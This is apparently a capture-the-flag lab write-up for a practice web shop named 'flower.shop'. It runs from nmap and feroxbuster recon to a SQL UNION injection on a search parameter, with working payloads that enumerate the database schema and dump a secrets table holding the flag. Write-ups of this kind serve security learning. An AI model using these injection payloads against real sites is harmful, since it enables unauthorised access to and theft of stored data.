# flower

## Recon 

Tool note: [nmap](../../../tools/recon/nmap.md).

```bash
nmap $TARGET
```

## Web Fuzz

Tool note: [feroxbuster](../../../tools/fuzz/feroxbuster.md).

```bash
feroxbuster -u http://flower.shop -w /usr/share/wordlists/dirb/common.txt -x js,html,php -d 5
```

## the page have a login and sign up form
### Let's sign
### We can apreciate that the page has a search input 

## Let's try to get an error form the database 

Tool note: [curl](../../../tools/web/curl.md).

```bash
curl http://flower.shop/search.php?q=%27
```

**Output**
```
<div class="fh-error">SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#039;%&#039; OR description LIKE &#039;%&#039;%&#039;&#039; at line 1</div>
```
### Testing sql union payloads

Technique: [SQL UNION injection](../../../exploits/web-disclosure/sql-union-injection.md).

```bash
q='UNION SELECT NULL,NULL,NULL,NULL-- -
```

### The table has 4 columns
' UNION SELECT NULL,NULL,NULL,DATABASE()#

**Output**
```
$flowerhaven
```

### We have the database name let's explore de tables
```bash
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema='flowerhaven'#
```

**Output**
```
cart_items,flowers,messages,secrets,users
```

### Now that we have all tables let's find some secrets!

```bash
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema='flowerhaven' AND table_name='users'#
_____
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema='flowerhaven' AND table_name='secrets'#
```

**Output**
```
id,username,email,password_hash,created_at
id,key,value
```
## Now let's dig in the secret's Table
```bash
' UNION SELECT NULL,GROUP_CONCAT(CONCAT(`key`,':',value) SEPARATOR ' | '),NULL,NULL FROM secrets#
```

**Output**
```
lag:WEBVERSE{petals_union_in_bloom} | admin_note:Reminder: rotate the POS vendor API key on the 1st of every month.
```

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [curl](../../../tools/web/curl.md)
- [sql-union-injection](../../../exploits/web-disclosure/sql-union-injection.md)
